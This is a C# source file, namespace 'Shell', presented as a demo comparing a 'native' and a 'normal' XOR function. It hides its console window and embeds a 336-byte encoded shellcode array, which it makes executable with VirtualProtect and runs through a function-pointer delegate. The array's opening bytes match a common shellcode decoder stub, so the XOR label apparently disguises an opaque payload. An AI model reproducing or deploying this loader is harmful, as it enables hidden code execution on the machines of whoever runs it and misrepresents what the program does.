using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace Shell
{
    class Program
    {
        #region "Win32 API"
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        #endregion

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int Handle, int showState);
        [DllImport("kernel32.dll")]
        public static extern int GetConsoleWindow();

        static void Main()
        {   
            int win = GetConsoleWindow();
            ShowWindow(win,0);

            Console.WriteLine("Hello World!");
            Console.WriteLine("Xor Native Output: {0}", XorNative("Code", "1337"));
            Console.WriteLine("Xor Normal Output: {0}", XorNormal("Code", "1337"));
            Console.WriteLine(XorNative("Code", "1337") == XorNormal("Code", "1337"));
            Console.ReadLine();
            
            return;
        }

        static string Xor(string input, string key)
        {
            char[] result = input.ToCharArray();
            for (int i = 0; i < result.Length; i++)
                result[i] = (char)(result[i] ^ key[i]);

            return new string(result);
        }

        private static string XorNormal(string input, string key)
        {
            char[] result = input.ToCharArray();
            for (int i = 0; i < result.Length; i++)
                result[i] = (char)(result[i] ^ key[i]);

            return new string(result);
        }

        private delegate void DelXorNative(char[] input, char[] key, int length, out IntPtr result);

        private static string XorNative(string input, string key)
        {
                        
            byte[] buf = new byte[336] {
0xda,0xc0,0xd9,0x74,0x24,0xf4,0x5d,0xb8,0xa2,0xf6,0x08,0x98,0x29,0xc9,0xb1,
0x4e,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0xa6,0x14,0xfd,0x64,0x4e,0x5a,
0xfe,0x94,0x8e,0x3b,0x76,0x71,0xbf,0x7b,0xec,0xf1,0xef,0x4b,0x66,0x57,0x03,
0x27,0x2a,0x4c,0x90,0x45,0xe3,0x63,0x11,0xe3,0xd5,0x4a,0xa2,0x58,0x25,0xcc,
0x20,0xa3,0x7a,0x2e,0x19,0x6c,0x8f,0x2f,0x5e,0x91,0x62,0x7d,0x37,0xdd,0xd1,
0x92,0x3c,0xab,0xe9,0x19,0x0e,0x3d,0x6a,0xfd,0xc6,0x3c,0x5b,0x50,0x5d,0x67,
0x7b,0x52,0xb2,0x13,0x32,0x4c,0xd7,0x1e,0x8c,0xe7,0x23,0xd4,0x0f,0x2e,0x7a,
0x15,0xa3,0x0f,0xb3,0xe4,0xbd,0x48,0x73,0x17,0xc8,0xa0,0x80,0xaa,0xcb,0x76,
0xfb,0x70,0x59,0x6d,0x5b,0xf2,0xf9,0x49,0x5a,0xd7,0x9c,0x1a,0x50,0x9c,0xeb,
0x45,0x74,0x23,0x3f,0xfe,0x80,0xa8,0xbe,0xd1,0x01,0xea,0xe4,0xf5,0x4a,0xa8,
0x85,0xac,0x36,0x1f,0xb9,0xaf,0x99,0xc0,0x1f,0xbb,0x37,0x14,0x12,0xe6,0x5f,
0xd9,0x1f,0x19,0x9f,0x75,0x17,0x6a,0xad,0xda,0x83,0xe4,0x9d,0x93,0x0d,0xf2,
0xe2,0x89,0xea,0x6c,0x1d,0x32,0x0b,0xa4,0xd9,0x66,0x5b,0xde,0xc8,0x06,0x30,
0x1e,0xf5,0xd2,0xad,0x15,0x50,0x8d,0xd3,0xd7,0x08,0x2c,0x7e,0x2a,0xa4,0xc4,
0x71,0xf5,0xd4,0xe6,0x5b,0x9e,0x7c,0x1b,0x64,0xb0,0x20,0x92,0x82,0xd8,0xc8,
0xf2,0x1d,0x75,0x2a,0x21,0x96,0xe2,0x55,0x03,0x5c,0x2c,0xdc,0xf4,0x08,0xc5,
0xa9,0xec,0x8f,0xea,0x2a,0x3b,0xb8,0x7c,0xa0,0x28,0x7c,0x9c,0xb7,0x64,0xd4,
0xc9,0x2f,0xf2,0xb5,0xb8,0xce,0x03,0x9c,0x29,0x10,0x96,0x1b,0xf8,0x47,0x0e,
0x26,0xdd,0xaf,0x91,0xd9,0x08,0xac,0xd6,0x26,0xcd,0x9f,0xad,0x11,0x5b,0x9f,
0xd9,0x5d,0x8b,0x1f,0x1a,0x08,0xc1,0x1f,0x72,0xec,0xb1,0x4c,0x67,0xf3,0x6f,
0xe1,0x34,0x66,0x90,0x53,0xe8,0x21,0xf8,0x59,0xd7,0x06,0xa7,0xa2,0x32,0x15,
0xa0,0x5c,0xc3,0x1d,0x50,0x9f,0x12,0xe4,0x27,0xf6,0xa6,0x53,0x37,0xbd,0x8b,
0xf2,0xd2,0xbd,0x98,0x05,0xf7 };

            IntPtr myShellcodePtr = IntPtr.Zero;
            string resultStr = string.Empty;

            try
            {
                GCHandle pinnedArray = GCHandle.Alloc(buf, GCHandleType.Pinned);
                // get handle for shellcode

                IntPtr pointer = pinnedArray.AddrOfPinnedObject(); // get address

                DelXorNative myxorIt = (DelXorNative)Marshal.GetDelegateForFunctionPointer(pointer,
                    typeof(DelXorNative)); // convert function-pointer to delegate

                uint flOldProtect;

                VirtualProtect(pointer, (UIntPtr)buf.Length, PAGE_EXECUTE_READWRITE,
                    out flOldProtect); // make shellcode executable

                IntPtr byteOut = IntPtr.Zero;

                myxorIt(input.ToCharArray(), key.ToCharArray(), input.Length, out byteOut);
                // execute shellcode

                VirtualProtect(pointer, (UIntPtr)buf.Length, flOldProtect,
                    out flOldProtect); // restore old flag

                pinnedArray.Free();

                byte[] result = new byte[input.Length];
                Marshal.Copy(byteOut, result, 0, input.Length);
                // here is our returned byte array in result

                resultStr = Encoding.UTF8.GetString(result);
            }
            finally // cleanup
            {
                if (myShellcodePtr != IntPtr.Zero)
                {
                    Marshal.FreeCoTaskMem(myShellcodePtr);
                    myShellcodePtr = IntPtr.Zero;
                }
            }
            return resultStr;
        }
    }

}